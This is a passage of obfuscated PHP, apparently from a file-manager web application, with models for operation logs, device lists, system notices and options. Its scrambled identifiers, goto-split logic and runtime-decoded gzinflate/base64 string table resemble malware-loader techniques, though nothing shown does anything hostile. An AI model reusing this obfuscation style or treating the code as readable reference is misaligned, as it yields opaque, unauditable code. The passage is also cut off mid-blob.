(isset($aÚÑÚá†„[$aÚ¯¾ÈÛ´÷])) { $bŒ’›ôŒ¥‚ = array_merge($bŒ’›ôŒ¥‚, $aÚÑÚá†„[$aÚ¯¾ÈÛ´÷]); } } $bŒ’›ôŒ¥‚ = array_unique($bŒ’›ôŒ¥‚); if ($bŒ’›ôŒ¥‚) { $c–å©Ã¨­[$EØë¨„ÙÂ[29]] = array($EØë¨„ÙÂ[7], $bŒ’›ôŒ¥‚); } } goto a…áŒ»³‡¾; Bíùê¤’‰¸: $b™å’ µÔ§[$EØë¨„ÙÂ[365]] = $this->logList($b™å’ µÔ§[$EØë¨„ÙÂ[365]]); return $b™å’ µÔ§; goto A·ÃãÏ§ƒ; A·ÃãÏ§ƒ: } private function ipAddress(&$AùÅŠ®¥¶Š) { $FĞßæŸ¼ìÇ =& $_SERVER[ÉóçÄÇ]; if (!empty($AùÅŠ®¥¶Š[$FĞßæŸ¼ìÇ[2069]])) { $f­Ä½–®Ş« = IpLocation::get($AùÅŠ®¥¶Š[$FĞßæŸ¼ìÇ[2069]]); } else { $f­Ä½–®Ş« = LNG($FĞßæŸ¼ìÇ[2070]); } $AùÅŠ®¥¶Š[$FĞßæŸ¼ìÇ[2071]] = $f­Ä½–®Ş«; } private function descZipDownload($a‹°Äáë…÷, &$EÎî·‘™÷‡) { $cŸä«ó¾Çœ =& $_SERVER[ÉóçÄÇ]; if (!isset($a‹°Äáë…÷[$cŸä«ó¾Çœ[2072]])) { return; } $fƒÄµˆÈÇ = json_decode($a‹°Äáë…÷[$cŸä«ó¾Çœ[2072]], !0); foreach ($fƒÄµˆÈÇ as $bÜ‹—Õ˜¤Å) { try { $a¡×Ô¥¹ÆÔ = IO::infoFull($bÜ‹—Õ˜¤Å[$cŸä«ó¾Çœ[75]]); } catch (Exception $AÔá­õÖ¹) { continue; } $a‹°Äáë…÷[$cŸä«ó¾Çœ[75]] = $bÜ‹—Õ˜¤Å[$cŸä«ó¾Çœ[75]]; $EÎî·‘™÷‡[] = $a‹°Äáë…÷[$cŸä«ó¾Çœ[390]] = $a¡×Ô¥¹ÆÔ[$cŸä«ó¾Çœ[390]]; $EÎî·‘™÷‡[] = $a‹°Äáë…÷[$cŸä«ó¾Çœ[1889]] = $a¡×Ô¥¹ÆÔ[$cŸä«ó¾Çœ[472]]; break; } return $a‹°Äáë…÷; } private function getSourceList(&$EÙÁæ²‡„›) { $Cµ…íù¶¡ =& $_SERVER[ÉóçÄÇ]; $FÃ¢¯©¿ñä = array(); foreach ($EÙÁæ²‡„› as $a¬ÖœŞÁ¹ => $E·²ƒñŸŞ¢) { goto a˜…öŞ“›; cÕæ´ÔÛ·©: $FÃ¢¯©¿ñä[] = $FÖìæÂÒÉª[$Cµ…íù¶¡[390]]; $FÃ¢¯©¿ñä[] = $FÖìæÂÒÉª[$Cµ…íù¶¡[1889]]; if ($FÖìæÂÒÉª[$Cµ…íù¶¡[29]] == $Cµ…íù¶¡[515]) { $FÃ¢¯©¿ñä[] = $FÖìæÂÒÉª[$Cµ…íù¶¡[425]][$Cµ…íù¶¡[1037]]; $FÃ¢¯©¿ñä[] = $FÖìæÂÒÉª[$Cµ…íù¶¡[425]][$Cµ…íù¶¡[1038]]; } goto f—îÎÉŒâ; a˜…öŞ“›: $FÖìæÂÒÉª = json_decode($E·²ƒñŸŞ¢[$Cµ…íù¶¡[425]], !0); if ($E·²ƒñŸŞ¢[$Cµ…íù¶¡[29]] == $Cµ…íù¶¡[1645]) { $FÖìæÂÒÉª = $this->descZipDownload($FÖìæÂÒÉª, $FÃ¢¯©¿ñä); $EÙÁæ²‡„›[$a¬ÖœŞÁ¹][$Cµ…íù¶¡[425]] = json_encode($FÖìæÂÒÉª); continue; } if (strpos($E·²ƒñŸŞ¢[$Cµ…íù¶¡[29]], $Cµ…íù¶¡[1890]) !== 0) { if (!isset($FÖìæÂÒÉª[$Cµ…íù¶¡[75]]) || strpos($E·²ƒñŸŞ¢[$Cµ…íù¶¡[29]], $Cµ…íù¶¡[2073]) !== 0) { continue; } try { $Aœ«Áõ²ø = IO::infoFull($FÖìæÂÒÉª[$Cµ…íù¶¡[75]]); } catch (Exception $EË…ïÅöÎë) { continue; } $FÃ¢¯©¿ñä[] = $FÖìæÂÒÉª[$Cµ…íù¶¡[390]] = $Aœ«Áõ²ø[$Cµ…íù¶¡[390]]; $FÃ¢¯©¿ñä[] = $FÖìæÂÒÉª[$Cµ…íù¶¡[1889]] = $Aœ«Áõ²ø[$Cµ…íù¶¡[472]]; $EÙÁæ²‡„›[$a¬ÖœŞÁ¹][$Cµ…íù¶¡[425]] = json_encode($FÖìæÂÒÉª); continue; } goto cÕæ´ÔÛ·©; f—îÎÉŒâ: if ($FÖìæÂÒÉª[$Cµ…íù¶¡[29]] == $Cµ…íù¶¡[1897]) { $FÃ¢¯©¿ñä[] = $FÖìæÂÒÉª[$Cµ…íù¶¡[425]][$Cµ…íù¶¡[390]]; } goto f¬óô¬£²Ë; f¬óô¬£²Ë: } if (!$FÃ¢¯©¿ñä) { return array(); } return Model($Cµ…íù¶¡[776])->sourceListInfo($FÃ¢¯©¿ñä, !0); } private function logList($eÕÅÜÎ¦†‘) { goto cİŒŒ×Í¥; DÑõ—à‹–˜: $e™¦æ¡ğãì = $this->getSourceList($eÕÅÜÎ¦†‘); $C´Œ Å”Ó = $this->typeAll(); $E®×ÊšğÜ© = array(); goto cÈ½Á·“Ë; cİŒŒ×Í¥: $AõæÅìŒ†ä =& $_SERVER[ÉóçÄÇ]; $b¯ó‹ôØÊ© = array_to_keyvalue($eÕÅÜÎ¦†‘, $AõæÅìŒ†ä[33], $AõæÅìŒ†ä[1511]); $DÄ¾õêç™ì = Model($AõæÅìŒ†ä[501])->userListInfo(array_unique($b¯ó‹ôØÊ©)); goto DÑõ—à‹–˜; cÈ½Á·“Ë: $AˆóÄ°Üãà = array(); foreach ($eÕÅÜÎ¦†‘ as $e‰ó†…£©‹ => $cÇÑƒÚæ¢Æ) { goto dµÍç“¬”; dµÍç“¬”: $D“Îˆ‚áğ¨ = $cÇÑƒÚæ¢Æ[$AõæÅìŒ†ä[29]]; $A¹®™¦¬ªÙ = isset($DÄ¾õêç™ì[$cÇÑƒÚæ¢Æ[$AõæÅìŒ†ä[1511]]]) ? $DÄ¾õêç™ì[$cÇÑƒÚæ¢Æ[$AõæÅìŒ†ä[1511]]] : !1; $C²ã²İÊ´¥ = strpos($D“Îˆ‚áğ¨, $AõæÅìŒ†ä[2074]) === 0 ? LNG($AõæÅìŒ†ä[2075]) : LNG($AõæÅìŒ†ä[2070]); goto EÃç†Ô…Ïá; döªãÀ‘ÏÁ: $cÇÑƒÚæ¢Æ[$AõæÅìŒ†ä[1832]] = $A¹®™¦¬ªÙ; $BŒ“‚çµ = json_decode($cÇÑƒÚæ¢Æ[$AõæÅìŒ†ä[425]], !0); $cÇÑƒÚæ¢Æ[$AõæÅìŒ†ä[2069]] = isset($BŒ“‚çµ[$AõæÅìŒ†ä[2069]]) ? $BŒ“‚çµ[$AõæÅìŒ†ä[2069]] : $AõæÅìŒ†ä[33]; goto E”¦ëÊó§Å; F”´È›Òº: unset($cÇÑƒÚæ¢Æ[$AõæÅìŒ†ä[2076]]); $E®×ÊšğÜ©[] = $cÇÑƒÚæ¢Æ; goto AÚ˜£Ê†¢‰; EÃç†Ô…Ïá: $cÇÑƒÚæ¢Æ[$AõæÅìŒ†ä[28]] = isset($A¹®™¦¬ªÙ[$AõæÅìŒ†ä[28]]) ? $A¹®™¦¬ªÙ[$AõæÅìŒ†ä[28]] : LNG($AõæÅìŒ†ä[2070]); $cÇÑƒÚæ¢Æ[$AõæÅìŒ†ä[1938]] = isset($A¹®™¦¬ªÙ[$AõæÅìŒ†ä[1938]]) ? $A¹®™¦¬ªÙ[$AõæÅìŒ†ä[1938]] : $AõæÅìŒ†ä[33]; $cÇÑƒÚæ¢Æ[$AõæÅìŒ†ä[1414]] = isset($C´Œ Å”Ó[$D“Îˆ‚áğ¨]) ? $C´Œ Å”Ó[$D“Îˆ‚áğ¨] : $C²ã²İÊ´¥; goto döªãÀ‘ÏÁ; E”¦ëÊó§Å: $this->ipAddress($cÇÑƒÚæ¢Æ); if (strpos($D“Îˆ‚áğ¨, $AõæÅìŒ†ä[1890]) === 0 || isset($BŒ“‚çµ[$AõæÅìŒ†ä[1889]])) { goto BÍÃÛŞÆ¬; BÍÃÛŞÆ¬: $BŒ“‚çµ[$AõæÅìŒ†ä[84]] = $e™¦æ¡ğãì[$BŒ“‚çµ[$AõæÅìŒ†ä[390]]]; $BŒ“‚çµ[$AõæÅìŒ†ä[1902]] = $e™¦æ¡ğãì[$BŒ“‚çµ[$AõæÅìŒ†ä[1889]]]; if ($BŒ“‚çµ[$AõæÅìŒ†ä[29]] == $AõæÅìŒ†ä[515]) { $BŒ“‚çµ[$AõæÅìŒ†ä[425]][$AõæÅìŒ†ä[1037]] = $e™¦æ¡ğãì[$BŒ“‚çµ[$AõæÅìŒ†ä[425]][$AõæÅìŒ†ä[1037]]]; $BŒ“‚çµ[$AõæÅìŒ†ä[425]][$AõæÅìŒ†ä[1038]] = $e™¦æ¡ğãì[$BŒ“‚çµ[$AõæÅìŒ†ä[425]][$AõæÅìŒ†ä[1038]]]; } goto aË”äæ¼§È; aË”äæ¼§È: if ($BŒ“‚çµ[$AõæÅìŒ†ä[29]] == $AõæÅìŒ†ä[1897]) { $BŒ“‚çµ[$AõæÅìŒ†ä[425]][$AõæÅìŒ†ä[390]] = $e™¦æ¡ğãì[$BŒ“‚çµ[$AõæÅìŒ†ä[425]][$AõæÅìŒ†ä[390]]]; } if ($BŒ“‚çµ[$AõæÅìŒ†ä[29]] == $AõæÅìŒ†ä[1640]) { $BŒ“‚çµ[$AõæÅìŒ†ä[1902]] = $BŒ“‚çµ[$AõæÅìŒ†ä[84]]; $BŒ“‚çµ[$AõæÅìŒ†ä[1889]] = $BŒ“‚çµ[$AõæÅìŒ†ä[1902]][$AõæÅìŒ†ä[390]]; $BŒ“‚çµ[$AõæÅìŒ†ä[84]] = !1; $BŒ“‚çµ[$AõæÅìŒ†ä[390]] = $AõæÅìŒ†ä[33]; } if ($BŒ“‚çµ[$AõæÅìŒ†ä[84]] && $BŒ“‚çµ[$AõæÅìŒ†ä[84]][$AõæÅìŒ†ä[398]] == $AõæÅìŒ†ä[1151]) { $AˆóÄ°Üãà[] = $cÇÑƒÚæ¢Æ[$AõæÅìŒ†ä[388]]; unset($eÕÅÜÎ¦†‘[$e‰ó†…£©‹]); continue; } goto DÍçå¥œÒÉ; DÍçå¥œÒÉ: if ($BŒ“‚çµ[$AõæÅìŒ†ä[1902]] && $BŒ“‚çµ[$AõæÅìŒ†ä[1902]][$AõæÅìŒ†ä[398]] == $AõæÅìŒ†ä[1151]) { $AˆóÄ°Üãà[] = $cÇÑƒÚæ¢Æ[$AõæÅìŒ†ä[388]]; unset($eÕÅÜÎ¦†‘[$e‰ó†…£©‹]); continue; } goto dÅ§É· Áé; dÅ§É· Áé: } $cÇÑƒÚæ¢Æ[$AõæÅìŒ†ä[425]] = $BŒ“‚çµ; goto F”´È›Òº; AÚ˜£Ê†¢‰: } $this->clearSystemPathLog($AˆóÄ°Üãà); goto DÏ¤Ô­¹ÔÃ; DÏ¤Ô­¹ÔÃ: return $E®×ÊšğÜ©; goto c·³ĞïÉñ; c·³ĞïÉñ: } private function clearSystemPathLog($Fƒ”†ŞĞÖ) { $d‹ğ°»¬—„ =& $_SERVER[ÉóçÄÇ]; if (count($Fƒ”†ŞĞÖ) == 0) { return; } $eÉË†œÌ’ = array($d‹ğ°»¬—„[388] => array($d‹ğ°»¬—„[7], array_unique($Fƒ”†ŞĞÖ))); $this->where($eÉË†œÌ’)->delete(); } public function deviceList($E«ˆùÌ½ŠÈ, $eÙ“§‹‘å = 0) { $c”Š ±Åëò =& $_SERVER[ÉóçÄÇ]; $d¶º¬”‚öğ = array($c”Š ±Åëò[1511] => $E«ˆùÌ½ŠÈ, $c”Š ±Åëò[192] => array($c”Š ±Åëò[953], $eÙ“§‹‘å), $c”Š ±Åëò[29] => $c”Š ±Åëò[1614]); $DË¶¾ÑÎ‹Ã = array(); $dƒßô¾ƒ¢ = $this->field($c”Š ±Åëò[2077])->where($d¶º¬”‚öğ)->order($c”Š ±Åëò[1900])->limit(50)->select(); foreach ($dƒßô¾ƒ¢ as $cÙ”ëâ›±æ => $DæùÖšö•) { goto bï¶Æ…—Ô—; Eñôˆ˜½: unset($fÕĞ¤ç³œè[$c”Š ±Åëò[2069]]); $aé˜½’…Øî = $this->deviceType($fÕĞ¤ç³œè[$c”Š ±Åëò[1891]]); if (isset($DË¶¾ÑÎ‹Ã[$aé˜½’…Øî])) { continue; } goto F·ßá„é¨; F·ßá„é¨: $this->ipAddress($DæùÖšö•); $DæùÖšö•[$c”Š ±Åëò[425]] = $fÕĞ¤ç³œè; $DË¶¾ÑÎ‹Ã[$aé˜½’…Øî] = $DæùÖšö•; goto eé¡ÊÃ ä½; bï¶Æ…—Ô—: if ($cÙ”ëâ›±æ > 0 && abs($DæùÖšö•[$c”Š ±Åëò[192]] - $dƒßô¾ƒ¢[$cÙ”ëâ›±æ - 1][$c”Š ±Åëò[192]]) < 5) { continue; } $fÕĞ¤ç³œè = json_decode($DæùÖšö•[$c”Š ±Åëò[425]], !0); $DæùÖšö•[$c”Š ±Åëò[2069]] = isset($fÕĞ¤ç³œè[$c”Š ±Åëò[2069]]) ? $fÕĞ¤ç³œè[$c”Š ±Åëò[2069]] : $c”Š ±Åëò[33]; goto Eñôˆ˜½; eé¡ÊÃ ä½: } return array_values($DË¶¾ÑÎ‹Ã); } public function deviceType($D–éÙ÷„…£) { return $D–éÙ÷„…£; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\156\157\164\151\143\x65\114\x69\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\x63\x6f\156\164\x65\x6e\x74", "\141\x75\x74\x68", "\x6d\157\144\145", "\164\x69\155\x65", "\164\171\x70\x65", "\154\145\166\145\x6c", "\x65\156\141\x62\x6c\x65", "\163\157\162\x74"); public function listData($fê‚‰–‹ì = false, $B´»‘˜…×ê = "\163\x6f\162\x74", $dù”‹‡ƒ¼ = false) { return parent::listData($fê‚‰–‹ì, $B´»‘˜…×ê, $dù”‹‡ƒ¼); } public function add($d¥ß¨ªÆî) { $b¥‰ºÜÈ‹ =& $_SERVER[ÉóçÄÇ]; $bÔ¼¦…†¯ = time(); if ($d¥ß¨ªÆî[$b¥‰ºÜÈ‹[12]] == $b¥‰ºÜÈ‹[2078]) { $bÔ¼¦…†¯ = strtotime($d¥ß¨ªÆî[$b¥‰ºÜÈ‹[195]]); } $d¥ß¨ªÆî[$b¥‰ºÜÈ‹[195]] = $bÔ¼¦…†¯; return parent::insert($d¥ß¨ªÆî); } public function update($EŒÔ¼é®ª‰, $cÙ©¸²³¸…) { goto Dô¦›ğŸµ; Dô¦›ğŸµ: $Cˆ‡¹ØØ =& $_SERVER[ÉóçÄÇ]; $dÚÎ­Û¢ğî = $this->listData($EŒÔ¼é®ª‰); if (!$dÚÎ­Û¢ğî) { return !1; } goto D¥µ˜ôêì; D¥µ˜ôêì: $a¸Õ¹Í³Ã = time(); if ($cÙ©¸²³¸…[$Cˆ‡¹ØØ[12]] == $Cˆ‡¹ØØ[2078]) { $a¸Õ¹Í³Ã = strtotime($cÙ©¸²³¸…[$Cˆ‡¹ØØ[195]]); } $cÙ©¸²³¸…[$Cˆ‡¹ØØ[195]] = $a¸Õ¹Í³Ã; goto aî²ÑŒ¢¯‹; aî²ÑŒ¢¯‹: return parent::update($EŒÔ¼é®ª‰, $cÙ©¸²³¸…); goto b’±éÓš·Š; b’±éÓš·Š: } public function remove($Cİ‡ÆÓ›ŸÊ) { $BÚ²Â‰®†¥ = $this->listData($Cİ‡ÆÓ›ŸÊ); if (!$BÚ²Â‰®†¥ || $BÚ²Â‰®†¥[$_SERVER[ÉóçÄÇ][1151]]) { return !1; } return parent::remove($Cİ‡ÆÓ›ŸÊ); } public function sort($e»ÌœŠÑ¹, $aŸçÙïªæÌ) { return parent::update($e»ÌœŠÑ¹, $aŸçÙïªæÌ); } public function enable($D„Œ¼âã˜¶, $BåÓ˜îÕ»É) { return parent::update($D„Œ¼âã˜¶, array($_SERVER[ÉóçÄÇ][2079] => $BåÓ˜îÕ»É)); } private function initUserOption() { $BÀ°ÚŠ×‘œ =& $_SERVER[ÉóçÄÇ]; $this->optionType = $BÀ°ÚŠ×‘œ[2080]; $this->modelType = $BÀ°ÚŠ×‘œ[2081]; $this->field = array($BÀ°ÚŠ×‘œ[2082], $BÀ°ÚŠ×‘œ[28], $BÀ°ÚŠ×‘œ[195], $BÀ°ÚŠ×‘œ[29], $BÀ°ÚŠ×‘œ[2083], $BÀ°ÚŠ×‘œ[711], $BÀ°ÚŠ×‘œ[189]); } public function userNoticeGet($c¼»Øõª‹¹ = false) { $this->initUserOption(); return parent::listData($c¼»Øõª‹¹, $_SERVER[ÉóçÄÇ][388], !0); } public function userNoticeAdd($aèƒ ÜµÉ) { $B¯¯­¾Á…é =& $_SERVER[ÉóçÄÇ]; $this->initUserOption(); $Fä£©Ã‹‘ = $this->findByKey($B¯¯­¾Á…é[2082], $aèƒ ÜµÉ[$B¯¯­¾Á…é[388]]); if ($Fä£©Ã‹‘) { return !0; } $BŞÅòÑì‘» = array($B¯¯­¾Á…é[2082] => $aèƒ ÜµÉ[$B¯¯­¾Á…é[388]], $B¯¯­¾Á…é[28] => $aèƒ ÜµÉ[$B¯¯­¾Á…é[28]], $B¯¯­¾Á…é[195] => $aèƒ ÜµÉ[$B¯¯­¾Á…é[195]], $B¯¯­¾Á…é[29] => isset($aèƒ ÜµÉ[$B¯¯­¾Á…é[29]]) ? $aèƒ ÜµÉ[$B¯¯­¾Á…é[29]] : 1, $B¯¯­¾Á…é[2083] => isset($aèƒ ÜµÉ[$B¯¯­¾Á…é[2083]]) ? $aèƒ ÜµÉ[$B¯¯­¾Á…é[2083]] : 0, $B¯¯­¾Á…é[711] => 0, $B¯¯­¾Á…é[189] => 0); return parent::insert($BŞÅòÑì‘»); } public function userNoticeEdit($fÙÌ©’„Îİ, $b‡³ÓÎ´‹ß) { $this->initUserOption(); return parent::update($fÙÌ©’„Îİ, $b‡³ÓÎ´‹ß); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\164\x65\155\x5f\x6f\x70\x74\151\x6f\x6e"; protected $jsonField = array("\155\145\156\165", "\x72\x6f\x6c\145", "\162\157\x6c\x65\107\x72\x6f\165\160", "\162\145\147\151\x73\x74", "\145\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($E’½‡Ç¢¹¶) { return "\x53\171\x73\x74\x65\155\117\x70\x74\x69\x6f\x6e\x5f{$E’½‡Ç¢¹¶}"; } protected function optionDefault($E»ŸÎÎŠ = '') { $Fâ¥ã’§Ç­ =& $_SERVER[ÉóçÄÇ]; if ($E»ŸÎÎŠ == $Fâ¥ã’§Ç­[33]) { return $GLOBALS[$Fâ¥ã’§Ç­[6]][$Fâ¥ã’§Ç­[376]]; } } } goto DÖ’µ¹ğâ; c‰ÕÒŒÛ†: $E´ò«­ø„ = strrev(base64_decode($_SERVER[®Ãó…·ÈëÁ][0])); function binCheckNeq($eîğé•¡Ø´, $EÍÖ–ĞèùÇ) { return $eîğé•¡Ø´ != $EÍÖ–ĞèùÇ; } $_SERVER[$_SERVER[®Ãó…·ÈëÁ][1]] = $E´ò«­ø„($_SERVER[$_SERVER[®Ãó…·ÈëÁ][2]]); goto b”¦‘íƒì¸; cí¿á«¬õ±: if (!function_exists('_kodDe')) { function _kodDe($C³å¯“£“) { $C³å¯“£“ = base64_decode($C³å¯“£“); $d¥Ô½‹«ÚÙ = strlen($C³å¯“£“); $e£ÓÍ«ª–ó = ''; $fãíÃ®Å» = ord($C³å¯“£“[0]) - 30; for ($eõ‡Œ¸ÊØë = 1; $eõ‡Œ¸ÊØë < $d¥Ô½‹«ÚÙ; $eõ‡Œ¸ÊØë += 2) { if ($eõ‡Œ¸ÊØë + 1 < $d¥Ô½‹«ÚÙ) { $e£ÓÍ«ª–ó .= chr(ord($C³å¯“£“[$eõ‡Œ¸ÊØë + 1]) + $fãíÃ®Å»); $e£ÓÍ«ª–ó .= chr(ord($C³å¯“£“[$eõ‡Œ¸ÊØë]) + $fãíÃ®Å»); } else { $e£ÓÍ«ª–ó .= chr(ord($C³å¯“£“[$eõ‡Œ¸ÊØë]) + $fãíÃ®Å»); } } return $e£ÓÍ«ª–ó; } } define("\xc9\xf3\xe7\xc4\xc7", "\x8b\xf9\xc7\xe7"); $_SERVER[ÉóçÄÇ] = explode("\174\3\174\5\174\5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\175\7\174\124\125\326\270\135\161\155\237\53\366\225\107\24\223\300\224\204\44\224\100\210\223\144\222\14\114\62\141\146\102\50"._kodDe('MLHxurm6iVQ5O9RpzPSBRsYW+RCmXgScn55sxERk9HDFG1uY2dmOGKUyQHiyUw==')."\x6d\xff\xdb\xef\x7d\x6f\x26\xee\xf7\xff\xfd\xff\xfc\x80\x79\xb7\xb7\x73\xcf\x3d\xe7\xdc\x73\xce\xbd\xfb\xe9\xaf\x2e\x7a\xe8\xf9\x4f\x9e\x5a\x7c\xf0\xe2\x43\x17\x1f\xba\xfa\xf9\xe7"."\xaf\xb9\xe6\xce\xdd\xef\xe3\xd0\xe2\x83\x16\x1f\x8\xbe\xd0\xf7\xa8\xcb\x8e\x38\x0\xfd\x39\xf8\xb2\xe5\x25\x25\xcd\x13\x8e\x1c\xd7\x7a\xd4\x15\xf7\xdf\x25\xff\x59\xbe\x53\x5e\x19"."\xf0\xbf\xf4\xb2\xef\xe8\x57\xee\x9c\xee\xdd\x79\xeb\x4b\x83\x3b\xf\x3c\x60\xe1\x4d\x6b\xe\xaf\x6\x99\x71\xd9\x6a\xfc\x23\x65\x34\x53\x52\x6\x54\xc3\x34\x70\x44\x4c\xcb\x24\xd4".base64_decode('LvytZvCvG/8YvSnVVPB3tDUQjoba29q8wXCU1Cimp7U4+crKupwmlWcV3QBN').base64_decode('idVFs1pWyVhieERcNuVO2SA1NdRFG7xt/sCcaHhOm5fk6Iz25hR9EIfQZ8iU').base64_decode('dTOsphWWo19n/arzNvlapXDQ0xry1Id9gVYcXR9oafGF8+ODAb+/zlM/Iz+l').strrev(''."\n".'T¹2'."\r".'`_fòYƒ˜îÓ#3øâ¤ª£GñJ”,§´‰Zfª%) Hñjiè-')."\x7\x5a\xd9\x17\xe9\xbf\x92\x90\x73\x29\x32\x67\xd\x62\x20\xab\xab\x69\x99\xe\x7d\x86\x32\xc8\x62\xf1\x87\x9c\x33\x35\x35\x13\xc3\x1\xef\x80\xa9\xcb\x3c\x1e\xf4\x38\xa6\x2b\x69"."\45\103\252\12\171\375\336\372\260\4\273\51\65\6\3\55\22\131\212\264\154\230\212\56\165\64\173\203\136\11\166\275\246\30\215\270\130\302\345\332\133\301\204\110\36".strrev('öpş Á½WBšzÀZq–´éiŠyñ#›ªPoÁÊL¸5igIS®_¿')."\373\340\322\221\100\240\261\61\344\145\41\62\270\231\176\320\223\12\2\245\226\120\74\221\62\243\175\162\52\107\201\265\7\377\26\223\37\362\253\31\4\200\173\325\214".base64_decode('miPASqrQNLZzyEeO5lZoTBoU08ieAhusD3/WTMO/U0imzihMU3QzqmRiWlzN').base64_decode('kG1YS7YcATzZTDboKshHKtRcMS072KL1kTEk1JTiZ7ssoaXiis7DWVBcTCGD')."\121\207\204\322\255\271\264\230\205\5\143\111\65\25\327\351\346\374\265\234\140\373\253\211\101\276\11\15\55\247\307\24\37\330\46\274\154\33\353\111\71\311\244\230\46".base64_decode('GLRBx9WeTWlyPKTowlgbQcFAzhQjcyhbo6anGwC6IO2DTaK2F0joodskLkyh').base64_decode('i6C5knkXOH+eP+8c8F8pwXkR0rWkkkpFlQGFbKd0vMqgY3UbnWrGDWJw0BeI')."\46\145\43\331\22\257\212\242\122\24\225\306\225\1\127\66\231\45\73\236\155\362\210\5\334\341\352\264\152\246\127\100\310\51\55\46\247\304\221\342\357\244\151\146\103"."\x4a\x26\xe\x27\x84\x8c\x48\xeb\xcf\xa0\x9\xcb\x2a\xa\xc9\xd4\xe0\x90\xe2\x52\x8b\x34\x47\x6a\xae\x56\xab\xd\x5a\x30\x9d\x62\x5f\x74\x74\x2c\xce\x60\x91\xe6\x0\x81\x98\x22\x12"."\x56\x6\x4c\x32\x29\xd2\x94\x58\x52\xd6\xc1\x72\xd5\xe4\xcc\x84\x73\x12\x41\x2b\xd9\x6c\x4a\x8d\xc9\xa6\xaa\x65\xdc\x5a\xcc\x54\x4c\xa7\x61\xea\x8a\x4c\x6a\xf3\xc4\x62\x8a\x61\x38"."\xeb\xb5\x8c\xa9\x6b\x29\xa7\x27\x95\xd2\xfa\x9d\x1\x5d\xed\x52\x33\xd5\xd2\x58\x82\x84\x41\x22\xd8\xe6\x4e\x88\x18\xab\xc9\xde\x2d\x9a\x22\x41\x58\x81\x78\x61\x2c\x6e\x8d\xee\x49"."\226\133\227\63\106\102\321\235\136\262\151\252\45\260\36\14\57\322\154\15\252\221\325\14\25\166\257\132\222\115\123\216\45\41\116\341\325\327\374\112\176\65\223\122\63"."\112\136\136\357\100\126\325\25\203\366\125\152\152\11\223\112\100\355\212\263\115\227\273\322\162\265\224\315\165\202\231\41\273\267\100\34\316\115\246\246\132\212\301\240\103"."\112\347\14\323\251\53\0\71\251\340\30\44\153\354\113\70\133\340\326\122\225\270\63\4\160\70\211\256\50\253\224\0\330\110\64\15\307\66\207\303\155\121\137\43\70"."\252\133\275\321\26\117\270\276\231\164\333\224\273\150\237\375\0\63\263\52\151\344\154\47\330\142\20\260\132\301\130\171\144\233\326\257\350\240\341\272\301\152\251\107\213"."\x77\x6a\x3\x2e\x9a\x4\x33\x87\x0\xe\xa1\x99\xe1\x72\x67\x4d\x67\x50\xce\x74\xc1\xf9\xe9\x1c\x34\x15\x2\x7e\x46\x5f\x97\x75\xa2\xfd\x4a\xa6\xcb\x4c\xd2\x82\x21\x6f\x70\x96\x37".strrev('_~i¡fáSEk€Æày£YÂÎNZLÇÔÁÄ¨3”ê°ShJ'."\0".'3ä9 Ã'."\r".'').strrev('/:[ş	Ô®>$IlrHš 4nC¤M'."\0".'Pf‚–MßaVš¿n´\\Å92§˜œ')."\322\340\32\73\277\326\255\362\62\356\162\127\271\64\276\154\202\324\6\110\22\125\116\111\144\320\171\71\312\244\300\214\137\231\0\170\142\11\333\332\66\165\70\62\350"."\235\331\356\15\205\243\55\336\160\163\240\201\264\340\365\220\57\277\206\267\46\35\321\74\374\63\337\305\361\61\130\163\137\132\356\262\141\151\30\152\321\164\305\32\303".base64_decode('T40ONU7ROAw2K2pXkoxPhbXFtJSmyymIxSgQKxSzdKkJsj4YYfJASE1nKV4z')."\x93\xb9\x74\xa7\xf0\xe9\xe6\x5d\x21\xed\x82\x95\xa7\x7\x4d\x52\x63\x7\x9d\xa6\x93\xaf\x6a\x37\x29\x32\x66\x7c\x23\xc5\xd1\xee\x50\x5\xf8\xcb\x11\x72\x5c\x4b\xcb\x94\xdc\x45\xc8"."\x49\x89\x63\xec\x84\xa3\xc6\x5a\x52\x9a\x15\x99\x9f\x9c\xa6\x6e\x6a\x30\x56\xb7\x64\x69\x51\xcc\xa4\x46\x96\xab\x4b\xa1\x5d\xca\xb1\xbe\xd1\x5e\xc6\x95\x94\x42\xe7\x25\xa9\x50\xe4".base64_decode('Dmi4PjZdgFAD3/wsVY0gyAgJJxrugPQtjzBZ1hQ4RgKd3WCfEBJCNRqFUz+q')."\241\64\320\127\231\347\157\323\225\204\112\166\133\6\54\125\213\254\367\320\2\140\151\370\171\3\3\102\145\215\355\176\177\264\76\320\32\6\64\63\216\351\10\372\302"."\x5e\xa\x9c\x9e\x86\xa8\xa7\xbe\x8d\x9d\x9e\x7c\xa9\x49\x6\x88\x29\xf2\x8f\x1\x1c\xd3\x37\x5e\x38\x82\xf8\x59\xc5\xb1\x38\x3d\x63\x21\x96\xc6\xdf\x0\x2d\x67\xb5\x8c\xa1\x38\x63"."\244\266\70\307\347\70\307\24\33\62\317\53\301\51\365\1\247\234\36\162\246\301\64\71\131\327\255\107\253\24\26\117\150\37\131\106\216\267\341\304\2\106\210\236\351".strrev('ZÆ>d‡W_9¹ÅM™iID—“P€-)$ím¤è©ÔÙcP)m').strrev('KfáëãÅĞğkooÎ„µõ×ƒ@–ÑÖ¾ÍÂ-|œ¨ëA)Å:@÷RÚ')."\154\73\100\111\263\74\176\237\75\273\167\266\57\24\16\25\114\2\161\355\136\133\12\340\375\332\202\336\106\337\154\26\154\364\171\375\15\241\150\275\247\276\231\347\151"."\365\264\220\100\64\1\271\57\303\155\315\37\5\270\65\304\170\270\150\37\344\107\351\144\105\55\14\123\224\262\2\121\16\7\340\234\124\10\354\221\341\102\56\30\215"."\204\20\347\61\55\107\241\221\321\207\151\212\104\322\62\331\126\62\75\3\113\360\117\251\344\11\111\146\66\312\320\105\347\40\373\104\303\240\141\100\11\222\366\45\202"."\347\363\172\20\205\171\352\224\4\103\331\205\43\74\11\223\141\1\133\30\354\13\236\6\126\300\203\330\155\0\11\150\105\242\164\257\31\200\121\361\320\356\44\70\253"."\33\15\264\171\203\36\310\50\107\73\202\201\326\46\122\240\77\251\320\16\370\310\364\227\120\272\211\360\313\46\107\141\200\350\221\51\357\304\47\275\133\243\123\271\30"."\xff\x9c\x8d\x7f\x0\xbd\x47\x1a\x57\x32\x74\xd6\x3b\x21\xf2\x66\x88\x81\x32\x43\x60\x37\x50\xc4\xab\x